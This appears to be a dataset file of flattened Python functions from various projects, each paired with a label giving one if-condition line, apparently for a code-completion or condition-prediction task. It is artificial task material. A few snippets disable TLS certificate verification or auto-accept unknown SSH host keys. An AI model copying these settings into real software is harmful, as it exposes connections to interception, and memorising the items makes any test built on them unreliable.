{"input": "def setInt(self, path, value, **kwargs): if value is None: self.set(path, None, **kwargs) return minimum = kwargs.pop(\"min\", None) maximum = kwargs.pop(\"max\", None) try: intValue = int(value) if minimum is not None and intValue < minimum: intValue = minimum if maximum is not None and intValue > maximum: intValue = maximum except ValueError: self._logger.warning( \"Could not convert %r to a valid integer when setting option %r\" % (value, path) ) return self.set(path, intValue, **kwargs)", "label": "if maximum is not None and intValue > maximum :"}
{"input": "def _load_idle_extensions(self, sub_section, fp, lineno): extension_map = self.get_data(\"idle extensions\") if extension_map is None: extension_map = {} extensions = [] while 1: line, lineno, bBreak = self._readline(fp, lineno) if bBreak: break line = line.strip() if line: extensions.append(line) extension_map[sub_section] = extensions self._save_data(\"idle extensions\", extension_map) return line, lineno", "label": "if bBreak :"}
{"input": "def _get_config(key): config = db.session.execute( Configs.__table__.select().where(Configs.key == key) ).fetchone() if config and config.value: value = config.value if value and value.isdigit(): return int(value) elif value and isinstance(value, string_types): if value.lower() == \"true\": return True elif value.lower() == \"false\": return False else: return value # Flask-Caching is unable to roundtrip a value of None. # Return an exception so that we can still cache and avoid the db hit return KeyError", "label": "if value and value . isdigit ( ) :"}
{"input": "def check_labels(self): print(\"Checking labels if they are outside the image\") for i in self.Dataframe.index: image_name = os.path.join(self.project_path, i) im = PIL.Image.open(image_name) self.width, self.height = im.size for ind in self.individual_names: if ind == \"single\": self.Dataframe = MainFrame.force_outside_labels_Nans( self, i, ind, self.uniquebodyparts ) else: self.Dataframe = MainFrame.force_outside_labels_Nans( self, i, ind, self.multianimalbodyparts ) return self.Dataframe", "label": "if ind == \"single\" :"}
{"input": "def remove_excluded(self): \"\"\"Remove all sources marked as excluded.\"\"\" # import yaml # print yaml.dump({k:v.__json__() for k,v in self.sources.items()}, default_flow_style=False) sources = list(self.sources.values()) for src in sources: if src.excluded: del self.sources[src.name] src.imports = [m for m in src.imports if not self._exclude(m)] src.imported_by = [m for m in src.imported_by if not self._exclude(m)]", "label": "if src . excluded :"}
{"input": "def parse_scientific_formats(data, tree): scientific_formats = data.setdefault(\"scientific_formats\", {}) for elem in tree.findall(\".//scientificFormats/scientificFormatLength\"): type = elem.attrib.get(\"type\") if _should_skip_elem(elem, type, scientific_formats): continue pattern = text_type(elem.findtext(\"scientificFormat/pattern\")) scientific_formats[type] = numbers.parse_pattern(pattern)", "label": "if _should_skip_elem ( elem , type , scientific_formats ) :"}
{"input": "def _modifierCodes2Labels(cls, mods): if mods == 0: return [] modconstants = cls._modifierCodes modNameList = [] for k in modconstants._keys: mc = modconstants._names[k] if mods & k == k: modNameList.append(mc) mods = mods - k if mods == 0: return modNameList return modNameList", "label": "if mods == 0 :"}
{"input": "def to_pig_latin(text: str): if text is None: return \"\" words = text.lower().strip().split(\" \") text = [] for word in words: if word[0] in \"aeiou\": text.append(f\"{word}yay\") else: for letter in word: if letter in \"aeiou\": text.append( f\"{word[word.index(letter):]}{word[:word.index(letter)]}ay\" ) break return \" \".join(text)", "label": "if letter in \"aeiou\" :"}
{"input": "def __connect__(self) -> H2Protocol: if not self._connected: async with self._connect_lock: self._state = _ChannelState.CONNECTING if not self._connected: try: self._protocol = await self._create_connection() except Exception: self._state = _ChannelState.TRANSIENT_FAILURE raise else: self._state = _ChannelState.READY return cast(H2Protocol, self._protocol)", "label": "if not self . _connected :"}
{"input": "def run_commands(cmds): set_kubeconfig_environment_var() for cmd in cmds: process = subprocess.run( cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=os.environ, ) if process.stdout: logger.info(process.stdout) if process.stderr: logger.info(process.stderr) return process.stdout", "label": "if process . stderr :"}
{"input": "def deserialize(x): t = type(x) if t is list: return list(imap(deserialize, x)) if t is dict: if \"_id_\" not in x: return {key: deserialize(val) for key, val in iteritems(x)} obj = objmap.get(x[\"_id_\"]) if obj is None: entity_name = x[\"class\"] entity = database.entities[entity_name] pk = x[\"_pk_\"] obj = entity[pk] return obj return x", "label": "if \"_id_\" not in x :"}
{"input": "def _parse_arguments(self, handler_method): spec = DynamicArgumentParser().parse(self._argspec, self.longname) if not self._supports_kwargs: if spec.kwargs: raise DataError( \"Too few '%s' method parameters for **kwargs \" \"support.\" % self._run_keyword_method_name ) if spec.kwonlyargs: raise DataError( \"Too few '%s' method parameters for \" \"keyword-only arguments support.\" % self._run_keyword_method_name ) spec.types = GetKeywordTypes(self.library.get_instance())(self._handler_name) return spec", "label": "if spec . kwargs :"}
{"input": "def test_update_password_command(mocker, username, password, expected, changed): with mocker.patch.object(UpdatePassword, \"update_password\", return_value=changed): result, stdout, stderr = run_command( \"update_password\", username=username, password=password ) if result is None: assert stdout == expected else: assert str(result) == expected", "label": "if result is None :"}
{"input": "def characters(self, ch): if self.Text_tag: if self.Summary_tag: self.Summary_ch += ch elif self.Attack_Prerequisite_tag: self.Attack_Prerequisite_ch += ch elif self.Solution_or_Mitigation_tag: self.Solution_or_Mitigation_ch += ch elif self.CWE_ID_tag: self.CWE_ID_ch += ch", "label": "elif self . Attack_Prerequisite_tag :"}
{"input": "def _pybin_add_zip(pybin, libname, filter, exclusions, dirs, dirs_with_init_py): with zipfile.ZipFile(libname, \"r\") as lib: name_list = lib.namelist() for name in name_list: if filter(name) and not _is_python_excluded_path(name, exclusions): if dirs is not None and dirs_with_init_py is not None: _update_init_py_dirs(name, dirs, dirs_with_init_py) pybin.writestr(name, lib.read(name))", "label": "if filter ( name ) and not _is_python_excluded_path ( name , exclusions ) :"}
{"input": "def parseAGL(filename): # -> { 2126: 'Omega', ... } m = {} for line in readLines(filename): # Omega;2126 # dalethatafpatah;05D3 05B2 # higher-level combinations; ignored line = line.strip() if len(line) > 0 and line[0] != \"#\": name, uc = tuple([c.strip() for c in line.split(\";\")]) if uc.find(\" \") == -1: # it's a 1:1 mapping m[int(uc, 16)] = name return m", "label": "if uc . find ( \" \" ) == - 1 :"}
{"input": "def assertS_IS(self, name, mode): # test format, lstrip is for S_IFIFO fmt = getattr(stat, \"S_IF\" + name.lstrip(\"F\")) self.assertEqual(stat.S_IFMT(mode), fmt) # test that just one function returns true testname = \"S_IS\" + name for funcname in self.format_funcs: func = getattr(stat, funcname, None) if func is None: if funcname == testname: raise ValueError(funcname) continue if funcname == testname: self.assertTrue(func(mode)) else: self.assertFalse(func(mode))", "label": "if func is None :"}
{"input": "def metadata(draft): test_metadata = {} json_schema = create_jsonschema_from_metaschema(draft.registration_schema.schema) for key, value in json_schema[\"properties\"].items(): response = \"Test response\" items = value[\"properties\"][\"value\"].get(\"items\") enum = value[\"properties\"][\"value\"].get(\"enum\") if items: # multiselect response = [items[\"enum\"][0]] elif enum: # singleselect response = enum[0] elif value[\"properties\"][\"value\"].get(\"properties\"): response = {\"question\": {\"value\": \"Test Response\"}} test_metadata[key] = {\"value\": response} return test_metadata", "label": "if items :"}
{"input": "def decode_binary(binarystring): \"\"\"Decodes a binary string into it's integer value.\"\"\" n = 0 for c in binarystring: if c == \"0\": d = 0 elif c == \"1\": d = 1 else: raise ValueError(\"Not an binary number\", binarystring) # Could use ((n << 3 ) | d), but python 2.3 issues a FutureWarning. n = (n * 2) + d return n", "label": "if c == \"0\" :"}
{"input": "def getZoneOffset(d): zoffs = 0 try: if d[\"zulu\"] == None: zoffs = 60 * int(d[\"tzhour\"]) + int(d[\"tzminute\"]) if d[\"tzsign\"] != \"-\": zoffs = -zoffs except TypeError: pass return zoffs", "label": "if d [ \"zulu\" ] == None :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 10: self.add_module(d.getPrefixedString()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 10 :"}
{"input": "def _flow_open(self): rv = [] for pipe in self.pipes: if pipe._pipeline_all_methods_.issuperset({\"open\", self._method_open}): raise RuntimeError( f\"{pipe.__class__.__name__} pipe has double open methods.\" f\" Use `open` or `{self._method_open}`, not both.\" ) if \"open\" in pipe._pipeline_all_methods_: rv.append(pipe.open) if self._method_open in pipe._pipeline_all_methods_: rv.append(getattr(pipe, self._method_open)) return rv", "label": "if self . _method_open in pipe . _pipeline_all_methods_ :"}
{"input": "def list_and_filter_commands(filter_str): sorted_commands = list(_pwndbg.commands.commands) sorted_commands.sort(key=lambda x: x.__name__) if filter_str: filter_str = filter_str.lower() results = [] for c in sorted_commands: name = c.__name__ docs = c.__doc__ if docs: docs = docs.strip() if docs: docs = docs.splitlines()[0] if ( not filter_str or filter_str in name.lower() or (docs and filter_str in docs.lower()) ): results.append((name, docs)) return results", "label": "if docs :"}
{"input": "def _scale_action(action: np.ndarray, spec: specs.Array): \"\"\"Converts a single canonical action back to the given action spec.\"\"\" if isinstance(spec, specs.BoundedArray): # Get scale and offset of output action spec. scale = spec.maximum - spec.minimum offset = spec.minimum # Maybe clip the action. if clip: action = np.clip(action, -1.0, 1.0) # Map action to [0, 1]. action = 0.5 * (action + 1.0) # Map action to [spec.minimum, spec.maximum]. action *= scale action += offset return action", "label": "if clip :"}
{"input": "def genData(self, samples, inc, sps): self.prepModData(samples, inc, sps) data = Array.CreateInstance(float, samples) cycleLen = float(sps) / gcdlist(self.findAllFreq()) p = 1.0 c = 0 for i in range(int(cycleLen)): data[i] = p * self.ampl c = c + 2 * inc * self.freq * self.addModData(i) if int(c) % 2 == 0: p = 1.0 else: p = -1.0 self.fillData(cycleLen, samples, data) return data", "label": "if int ( c ) % 2 == 0 :"}
{"input": "def data_type(data, grouped=False, columns=None, key_on=\"idx\", iter_idx=None): \"\"\"Data type check for automatic import\"\"\" if iter_idx: return Data.from_mult_iters(idx=iter_idx, **data) if pd: if isinstance(data, (pd.Series, pd.DataFrame)): return Data.from_pandas( data, grouped=grouped, columns=columns, key_on=key_on ) if isinstance(data, (list, tuple, dict)): return Data.from_iter(data) else: raise ValueError(\"This data type is not supported by Vincent.\")", "label": "if isinstance ( data , ( pd . Series , pd . DataFrame ) ) :"}
{"input": "def addNames(self, import_names, node_names): for names in node_names: if isinstance(names, basestring): name = names elif names[1] is None: name = names[0] else: name = names[1] import_names[name] = True", "label": "elif names [ 1 ] is None :"}
{"input": "def validate_address(address_name): fields = [\"pincode\", \"city\", \"country_code\"] data = frappe.get_cached_value(\"Address\", address_name, fields, as_dict=1) or {} for field in fields: if not data.get(field): frappe.throw( _(\"Please set {0} for address {1}\").format( field.replace(\"-\", \"\"), address_name ), title=_(\"E-Invoicing Information Missing\"), )", "label": "if not data . get ( field ) :"}
{"input": "def content(computer, name, values): \"\"\"Compute the ``content`` property.\"\"\" if len(values) == 1: (value,) = values if value == \"normal\": return \"inhibit\" if computer[\"pseudo_type\"] else \"contents\" elif value == \"none\": return \"inhibit\" return _content_list(computer, values)", "label": "if value == \"normal\" :"}
{"input": "def _replace_list(self, items): results = [] for item in items: listvar = self._replace_variables_inside_possible_list_var(item) if listvar: results.extend(self[listvar]) else: results.append(self.replace_scalar(item)) return results", "label": "if listvar :"}
{"input": "def _groups_args_split(self, kwargs): groups_args_split = [] groups = kwargs[\"groups\"] for key, group in groups.iteritems(): mykwargs = kwargs.copy() del mykwargs[\"groups\"] if \"group_name\" in group: mykwargs[\"source_security_group_name\"] = group[\"group_name\"] if \"user_id\" in group: mykwargs[\"source_security_group_owner_id\"] = group[\"user_id\"] if \"group_id\" in group: mykwargs[\"source_security_group_id\"] = group[\"group_id\"] groups_args_split.append(mykwargs) return groups_args_split", "label": "if \"group_name\" in group :"}
{"input": "def WriteFlowOutputPluginLogEntries(self, entries): \"\"\"Writes flow output plugin log entries.\"\"\" flow_ids = [(e.client_id, e.flow_id) for e in entries] for f in flow_ids: if f not in self.flows: raise db.AtLeastOneUnknownFlowError(flow_ids) for e in entries: dest = self.flow_output_plugin_log_entries.setdefault( (e.client_id, e.flow_id), [] ) to_write = e.Copy() to_write.timestamp = rdfvalue.RDFDatetime.Now() dest.append(to_write)", "label": "if f not in self . flows :"}
{"input": "def connect(**auth): key = tuple(sorted(auth.items())) if key in connection_pool: ssh = connection_pool[key] if not ssh.get_transport() or not ssh.get_transport().is_active(): ssh.connect(**auth) else: ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(**auth) connection_pool[key] = ssh return ssh", "label": "if not ssh . get_transport ( ) or not ssh . get_transport ( ) . is_active ( ) :"}
{"input": "def __call__(self, *args, **kwargs): if self is S: if args: raise TypeError(\"S() takes no positional arguments, got: %r\" % (args,)) if not kwargs: raise TypeError(\"S() expected at least one kwarg, got none\") # TODO: typecheck kwarg vals? return _t_child(self, \"(\", (args, kwargs))", "label": "if args :"}
{"input": "def read_images(self, paths=[]): images = [] for img_path in paths: assert os.path.isfile(img_path), \"The {} isn't a valid file.\".format(img_path) img = cv2.imread(img_path) if img is None: logger.info(\"error in loading image:{}\".format(img_path)) continue img = img[:, :, ::-1] images.append(img) return images", "label": "if img is None :"}
{"input": "def get_polymorphic_model(data): for model in itervalues(models): polymorphic = model.opts.polymorphic if polymorphic: polymorphic_key = polymorphic if isinstance(polymorphic_key, bool): polymorphic_key = \"type\" if data.get(polymorphic_key) == model.__name__: return model raise ImproperlyConfigured(u\"No model found for data: {!r}\".format(data))", "label": "if isinstance ( polymorphic_key , bool ) :"}
{"input": "def parse_counter_style_name(tokens, counter_style): tokens = remove_whitespace(tokens) if len(tokens) == 1: (token,) = tokens if token.type == \"ident\": if token.lower_value in (\"decimal\", \"disc\"): if token.lower_value not in counter_style: return token.value elif token.lower_value != \"none\": return token.value", "label": "if token . lower_value in ( \"decimal\" , \"disc\" ) :"}
{"input": "def setUp(self): yield helpers.TestHandlerWithPopulatedDB.setUp(self) for r in (yield tw(user.db_get_users, 1, \"receiver\", \"en\")): if r[\"pgp_key_fingerprint\"] == \"BFB3C82D1B5F6A94BDAC55C6E70460ABF9A4C8C1\": self.rcvr_id = r[\"id\"]", "label": "if r [ \"pgp_key_fingerprint\" ] == \"BFB3C82D1B5F6A94BDAC55C6E70460ABF9A4C8C1\" :"}
{"input": "def check_that_oval_and_rule_id_match(xccdftree): for xccdfid, rule in rules_with_ids_generator(xccdftree): checks = rule.find(\"./{%s}check\" % XCCDF11_NS) if checks is None: print(\"Rule {0} doesn't have checks.\".format(xccdfid), file=sys.stderr) continue assert_that_check_ids_match_rule_id(checks, xccdfid)", "label": "if checks is None :"}
{"input": "def MakeWidthArray(fm): # Make character width array s = \"{\\n\\t\" cw = fm[\"Widths\"] for i in xrange(0, 256): if chr(i) == \"'\": s += \"'\\\\''\" elif chr(i) == \"\\\\\": s += \"'\\\\\\\\'\" elif i >= 32 and i <= 126: s += \"'\" + chr(i) + \"'\" else: s += \"chr(%d)\" % i s += \":\" + fm[\"Widths\"][i] if i < 255: s += \",\" if (i + 1) % 22 == 0: s += \"\\n\\t\" s += \"}\" return s", "label": "if chr ( i ) == \"'\" :"}
{"input": "def testCheckIPGenerator(self): for i, ip in self._ip_range(65536 if not unittest.F2B.fast else 1000): if i == 254: self.assertEqual(str(ip), \"127.0.0.255\") elif i == 255: self.assertEqual(str(ip), \"127.0.1.0\") elif i == 1000: self.assertEqual(str(ip), \"127.0.3.233\") elif i == 65534: self.assertEqual(str(ip), \"127.0.255.255\") elif i == 65535: self.assertEqual(str(ip), \"127.1.0.0\")", "label": "elif i == 65534 :"}
{"input": "def _fetch(obj, url, body, *args, **kwargs): if _is_running_from_main_thread(): body = urlencode(body).encode(\"utf-8\") response = self.fetch(url, body=body, method=\"POST\") if response.code >= 400: raise luigi.rpc.RPCError(\"Errror when connecting to remote scheduler\") return response.body.decode(\"utf-8\")", "label": "if response . code >= 400 :"}
{"input": "def isOrHasChild(parent, child): while child: if compare(parent, child): return True child = child.parentNode if not child: return False if child.nodeType != 1: child = None return False", "label": "if not child :"}
{"input": "def HandleCharFormatChange(self, id, code): if code == win32con.BN_CLICKED: editId = buttonControlMap.get(id) assert editId is not None, \"Format button has no associated edit control\" editControl = self.GetDlgItem(editId) existingFormat = editControl.GetDefaultCharFormat() flags = win32con.CF_SCREENFONTS d = win32ui.CreateFontDialog(existingFormat, flags, None, self) if d.DoModal() == win32con.IDOK: cf = d.GetCharFormat() editControl.SetDefaultCharFormat(cf) self.SetModified(1) return 0 # We handled this fully!", "label": "if d . DoModal ( ) == win32con . IDOK :"}
{"input": "def test___iter___two_points(self): cba = LineString([(1, 2), (3, 4)]) for i, xy in enumerate(cba): assert i in [0, 1] if i == 0: assert np.allclose(xy, (1, 2)) elif i == 1: assert np.allclose(xy, (3, 4)) assert i == 1", "label": "if i == 0 :"}
{"input": "def main(self): self.model.clear() active_handle = self.get_active(\"Family\") if active_handle: active = self.dbstate.db.get_family_from_handle(active_handle) if active: self.display_attributes(active) else: self.set_has_data(False) else: self.set_has_data(False)", "label": "if active :"}
{"input": "def findStyleName(element, style): oldStyle = DOM.getAttribute(element, \"className\") if oldStyle is None: return -1 idx = oldStyle.find(style) # Calculate matching index lastPos = len(oldStyle) while idx != -1: if idx == 0 or (oldStyle[idx - 1] == \" \"): last = idx + len(style) if (last == lastPos) or ((last < lastPos) and (oldStyle[last] == \" \")): break idx = oldStyle.find(style, idx + 1) return idx", "label": "if ( last == lastPos ) or ( ( last < lastPos ) and ( oldStyle [ last ] == \" \" ) ) :"}
{"input": "def result(self): \"\"\"Gets the formatted string result.\"\"\" if self.__group.isChecked(): if self.__moreThan.isChecked(): return \"gt%d\" % self.__min.value() if self.__lessThan.isChecked(): return \"lt%d\" % self.__max.value() if self.__range.isChecked(): return \"%d-%d\" % (self.__min.value(), self.__max.value()) return \"\"", "label": "if self . __moreThan . isChecked ( ) :"}
{"input": "def get_generic_exception_from_err_details(err_details): err = None if err_details.errcls is not None: err = err_details.errcls(err_details.message) if err_details.errcls is not errors.InternalServerError: err.set_linecol( err_details.detail_json.get(\"line\", -1), err_details.detail_json.get(\"column\", -1), ) return err", "label": "if err_details . errcls is not errors . InternalServerError :"}
{"input": "def convert_value(self, value, expression, connection, context): if value is None: return None geo_field = self.geo_field if geo_field.geodetic(connection): dist_att = \"m\" else: units = geo_field.units_name(connection) if units: dist_att = DistanceMeasure.unit_attname(units) else: dist_att = None if dist_att: return DistanceMeasure(**{dist_att: value}) return value", "label": "if units :"}
{"input": "def __init__(self, **kwargs): self.layout_cell = kwargs.pop(\"layout_cell\") self.theme = kwargs.pop(\"theme\") assert isinstance(self.layout_cell, LayoutCell) super(LayoutCellFormGroup, self).__init__(**kwargs) self.add_form_def( \"general\", LayoutCellGeneralInfoForm, kwargs={\"layout_cell\": self.layout_cell, \"theme\": self.theme}, ) plugin = self.layout_cell.instantiate_plugin() if plugin: form_class = plugin.get_editor_form_class() if form_class: self.add_form_def(\"plugin\", form_class, kwargs={\"plugin\": plugin})", "label": "if form_class :"}
{"input": "def load_model(self, model_dict): model_param = None model_meta = None for _, value in model_dict[\"model\"].items(): for model in value: if model.endswith(\"Meta\"): model_meta = value[model] if model.endswith(\"Param\"): model_param = value[model] LOGGER.info(\"load model\") self.set_model_meta(model_meta) self.set_model_param(model_param) self.loss = self.get_loss_function()", "label": "if model . endswith ( \"Meta\" ) :"}
{"input": "def add_plugin_single(name, plugin_to_add, parent): plugin_existing = parent.get_plugins(name) if plugin_existing is None: parent.add_plugin(name, plugin_to_add) else: if not plugin_existing.is_callable_plugin(): parent.update_plugin(name, plugin_to_add) else: error(\"Duplicated plugin {}!\".format(name))", "label": "if not plugin_existing . is_callable_plugin ( ) :"}
{"input": "def get_details(guid): searchResultId = guid searchResult = SearchResult.get(SearchResult.id == searchResultId) details_link = searchResult.details if details_link: logger.info(\"Redirecting to details link %s \" % details_link) if config.settings.main.dereferer: details_link = config.settings.main.dereferer.replace( \"$s\", urllib.quote(details_link) ) return redirect(details_link) logger.error(\"Unable to find details link for search result ID %d\" % searchResultId) return \"Unable to find details\", 500", "label": "if config . settings . main . dereferer :"}
{"input": "def SurroundedByParens(token): \"\"\"Check if it's an expression surrounded by parentheses.\"\"\" while token: if token.value == \",\": return False if token.value == \")\": return not token.next_token if token.OpensScope(): token = token.matching_bracket.next_token else: token = token.next_token return False", "label": "if token . value == \")\" :"}
{"input": "def __str__(self, prefix=\"\", printElemNumber=0): res = \"\" cnt = 0 for e in self.stat_: elm = \"\" if printElemNumber: elm = \"(%d)\" % cnt res += prefix + (\"stat%s <\\n\" % elm) res += e.__str__(prefix + \" \", printElemNumber) res += prefix + \">\\n\" cnt += 1 if self.has_more_files_found_: res += prefix + ( \"more_files_found: %s\\n\" % self.DebugFormatBool(self.more_files_found_) ) return res", "label": "if printElemNumber :"}
{"input": "def _get_constraints(self, params): constraints = {} for filter_name in self._get_filter_names(): raw_value = params.get(filter_name, None) if raw_value is not None: constraints[filter_name] = self._get_value(raw_value) return constraints", "label": "if raw_value is not None :"}
{"input": "def print_nested_help(self, args: argparse.Namespace) -> None: level = 0 parser = self.main_parser while True: if parser._subparsers is None: break if parser._subparsers._actions is None: break choices = parser._subparsers._actions[-1].choices value = getattr(args, \"level_%d\" % level) if value is None: parser.print_help() return if not choices: break if isinstance(choices, dict): parser = choices[value] else: return level += 1", "label": "if value is None :"}
{"input": "def prompts_dict(self, *args, **kwargs): r = super(WorkflowJobNode, self).prompts_dict(*args, **kwargs) # Explanation - WFJT extra_vars still break pattern, so they are not # put through prompts processing, but inventory and others are only accepted # if JT prompts for it, so it goes through this mechanism if self.workflow_job: if self.workflow_job.inventory_id: # workflow job inventory takes precedence r[\"inventory\"] = self.workflow_job.inventory if self.workflow_job.char_prompts: r.update(self.workflow_job.char_prompts) return r", "label": "if self . workflow_job . inventory_id :"}
{"input": "def _check_etc_hosts(): debug2(\" > hosts\\n\") for line in open(\"/etc/hosts\"): line = re.sub(r\"#.*\", \"\", line) words = line.strip().split() if not words: continue ip = words[0] names = words[1:] if _is_ip(ip): debug3(\"< %s %r\\n\" % (ip, names)) for n in names: check_host(n) found_host(n, ip)", "label": "if _is_ip ( ip ) :"}
{"input": "def add_variant_attribute_data_to_expected_data(data, variant, attribute_ids, pk=None): for assigned_attribute in variant.attributes.all(): header = f\"{assigned_attribute.attribute.slug} (variant attribute)\" if str(assigned_attribute.attribute.pk) in attribute_ids: value = get_attribute_value(assigned_attribute) if pk: data[pk][header] = value else: data[header] = value return data", "label": "if str ( assigned_attribute . attribute . pk ) in attribute_ids :"}
{"input": "def scrub_time(self, time): # used externally to set time by slider scrubbing debug(\"scrub_time: {0}\".format(time)) if time == 0: self.loop_backward() elif time == self.timer_duration: self.loop_forward() else: # time in between 0 and duration if self.timer_status == TIMER_STATUS_STOPPED: self.timer_status = TIMER_STATUS_PAUSED elif self.timer_status == TIMER_STATUS_EXPIRED: self.timer_status = TIMER_STATUS_PAUSED self.timer_time = time", "label": "if self . timer_status == TIMER_STATUS_STOPPED :"}
{"input": "def leave_AssignTarget( self, original_node: cst.AssignTarget, updated_node: cst.AssignTarget, ) -> cst.AssignTarget: # We can't use matchers here due to circular imports target = updated_node.target if isinstance(target, cst.Name): var_name = unmangled_name(target.value) if var_name in self.assignment_replacements: return self.assignment_replacements[var_name].deep_clone() return updated_node", "label": "if var_name in self . assignment_replacements :"}
{"input": "def step(self, action): assert self.action_space.contains(action) if self._state == 4: if action and self._case: return self._state, 10.0, True, {} else: return self._state, -10, True, {} else: if action: if self._state == 0: self._state = 2 else: self._state += 1 elif self._state == 2: self._state = self._case return self._state, -1, False, {}", "label": "if action and self . _case :"}
{"input": "def last_ok(nodes): for i in range(len(nodes) - 1, -1, -1): if ok_node(nodes[i]): node = nodes[i] if isinstance(node, ast.Starred): if ok_node(node.value): return node.value else: return None else: return nodes[i] return None", "label": "if ok_node ( nodes [ i ] ) :"}
{"input": "def __contains__(self, table_name): \"\"\"Check if the given table name exists in the database.\"\"\" try: table_name = normalize_table_name(table_name) if table_name in self.tables: return True if table_name in self.views: return True return False except ValueError: return False", "label": "if table_name in self . tables :"}
{"input": "def get_history_data(self, guid, count=1): history = {} if count < 1: return history key = self._make_key(guid) for i in range(0, self.db.llen(key)): r = self.db.lindex(key, i) c = msgpack.unpackb(r) if c[\"tries\"] == 0 or c[\"tries\"] is None: if c[\"data\"] not in history: history[c[\"data\"]] = c[\"timestamp\"] if len(history) >= count: break return history", "label": "if c [ \"data\" ] not in history :"}
{"input": "def _state_dec_to_imp(self, token): if token in (\"+\", \"-\"): self._state = self._state_global else: super(ObjCStates, self)._state_dec_to_imp(token) if self._state != self._state_imp: self._state = self._state_objc_dec_begin self.context.restart_new_function(token)", "label": "if self . _state != self . _state_imp :"}
{"input": "def _additional_handlers(self): handlers = [] if self.session.get(\"proxy\"): protocol, host, port = self._get_proxy() if protocol and host and port: handlers.append(sockshandler.SocksiPyHandler(protocol, host, port)) else: raise ChannelException(messages.channels.error_proxy_format) # Skip certificate checks ctx = ssl.create_default_context() ctx.check_hostname = False ctx.verify_mode = ssl.CERT_NONE handlers.append(urllib.request.HTTPSHandler(context=ctx)) return handlers", "label": "if protocol and host and port :"}
{"input": "def loadGCodeData(self, dataStream): if self._printing: return False self._lineCount = 0 for line in dataStream: # Strip out comments, we do not need to send comments if \";\" in line: line = line[: line.index(\";\")] # Strip out whitespace at the beginning/end this saves data to send. line = line.strip() if len(line) < 1: continue self._lineCount += 1 self._doCallback() return True", "label": "if len ( line ) < 1 :"}
{"input": "def get_headers_footers_xml(self, uri): for relKey, val in self.docx._part._rels.items(): if (val.reltype == uri) and (val.target_part.blob): yield relKey, self.xml_to_string(parse_xml(val.target_part.blob))", "label": "if ( val . reltype == uri ) and ( val . target_part . blob ) :"}
{"input": "def eventlist_name(name=None, key=\"core\"): if not name: name = get_cpustr() cache = getdir() fn = name if os.path.exists(fn): return fn if \".json\" not in name: fn = \"%s-%s.json\" % (name, key) if \"/\" in fn: return fn fn = \"%s/%s\" % (cache, fn) if not os.path.exists(fn): name = cpu_without_step(name) if \"*\" in fn: fn = \"%s/%s\" % (cache, name) else: fn = \"%s/%s-%s.json\" % (cache, name, key) return fn", "label": "if \"*\" in fn :"}
{"input": "def test09_authority(self): \"Testing the authority name & code routines.\" for s in srlist: if hasattr(s, \"auth\"): srs = SpatialReference(s.wkt) for target, tup in s.auth.items(): self.assertEqual(tup[0], srs.auth_name(target)) self.assertEqual(tup[1], srs.auth_code(target))", "label": "if hasattr ( s , \"auth\" ) :"}
{"input": "def astAssign(self, import_names, node): for node in node.nodes: if node.flags == \"OP_ASSIGN\": import_names[node.name] = True else: self.warning(\"Ignoring Assign %s\" % node.flags, node.lineno)", "label": "if node . flags == \"OP_ASSIGN\" :"}
{"input": "def _autojoin(self, __): if not self.auto_join: return try: result = self.get_bookmarks(method=self.storage_method) except XMPPError: return if self.storage_method == \"xep_0223\": bookmarks = result[\"pubsub\"][\"items\"][\"item\"][\"bookmarks\"] else: bookmarks = result[\"private\"][\"bookmarks\"] for conf in bookmarks[\"conferences\"]: if conf[\"autojoin\"]: log.debug(\"Auto joining %s as %s\", conf[\"jid\"], conf[\"nick\"]) self.xmpp[\"xep_0045\"].joinMUC( conf[\"jid\"], conf[\"nick\"], password=conf[\"password\"] )", "label": "if conf [ \"autojoin\" ] :"}
{"input": "def config_mode(self, config_command=\"conf t\", pattern=\"\"): output = \"\" if not self.check_config_mode(): output = self.send_command_timing( config_command, strip_command=False, strip_prompt=False ) if \"to enter configuration mode anyway\" in output: output += self.send_command_timing( \"YES\", strip_command=False, strip_prompt=False ) if not self.check_config_mode(): raise ValueError(\"Failed to enter configuration mode\") return output", "label": "if \"to enter configuration mode anyway\" in output :"}
{"input": "def work(self): idle_times = 0 while True: if shutting_down.is_set(): log.info(\"Stop sync worker\") break try: job = self.commit_queue.get(timeout=self.timeout, block=True) if job[\"type\"] == \"commit\": self.commits.append(job) log.debug(\"Got a commit job\") idle_times = 0 idle.clear() except Empty: log.debug(\"Nothing to do right now, going idle\") if idle_times > self.min_idle_times: idle.set() idle_times += 1 self.on_idle()", "label": "if idle_times > self . min_idle_times :"}
{"input": "def movies_iterator(): for row in self._tuple_iterator(query): id, guid, movie = self._parse(fields, row, offset=2) # Parse `guid` (if enabled, and not already parsed) if parse_guid: if id not in guids: guids[id] = Guid.parse(guid) guid = guids[id] # Return item yield id, guid, movie", "label": "if parse_guid :"}
{"input": "def timesince(value): diff = timezone.now() - value plural = \"\" if diff.days == 0: hours = int(diff.seconds / 3600.0) if hours != 1: plural = \"s\" return \"%d hour%s ago\" % (int(diff.seconds / 3600.0), plural) else: if diff.days != 1: plural = \"s\" return \"%d day%s ago\" % (diff.days, plural)", "label": "if diff . days != 1 :"}
{"input": "def connect(self, *args): if len(args) == 0: self.basepath = \"/\" return True # no setup required; connect is allways successful else: self.basepath = args[0] if not os.path.isdir(self.basepath): return \"No such directory: {p}\".format(p=self.basepath) return True", "label": "if not os . path . isdir ( self . basepath ) :"}
{"input": "def get_callable(self): if not self.func: prototype = self.get_prototype() self.func = cast(self.imp, prototype) if self.restype == ObjCInstance or self.restype == ObjCClass: self.func.restype = c_void_p else: self.func.restype = self.restype self.func.argtypes = self.argtypes return self.func", "label": "if self . restype == ObjCInstance or self . restype == ObjCClass :"}
{"input": "def on_task_output(self, task, config): for entry in task.entries: if \"torrent\" in entry: if entry[\"torrent\"].modified: # re-write data into a file log.debug(\"Writing modified torrent file for %s\" % entry[\"title\"]) with open(entry[\"file\"], \"wb+\") as f: f.write(entry[\"torrent\"].encode())", "label": "if \"torrent\" in entry :"}
